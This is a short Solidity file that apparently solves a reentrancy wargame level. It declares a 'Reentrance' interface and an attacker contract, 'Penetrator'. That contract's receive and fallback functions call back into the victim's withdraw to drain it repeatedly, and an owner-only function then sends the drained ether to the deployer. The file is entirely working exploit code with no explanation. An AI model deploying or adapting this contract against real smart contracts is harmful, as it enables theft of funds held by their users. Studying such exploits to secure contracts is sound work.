// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

contract Reentrance {
    function donate(address) public payable {}

    function balanceOf(address) public view returns (uint) {}

    function withdraw(uint) public {}

    receive() external payable {}
}

contract Penetrator {
    address owner;
    Reentrance victim;

    constructor(address _victimAddress) public {
        owner = msg.sender;
        victim = Reentrance(payable(_victimAddress));
    }

    function withdraw() public {
        require(msg.sender == owner);
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        if (!success) revert();
    }

    receive() external payable {
        uint256 balance = victim.balanceOf(address(this));
        victim.withdraw(balance);
    }

    fallback() external payable {
        uint256 balance = victim.balanceOf(address(this));
        victim.withdraw(balance);
    }
}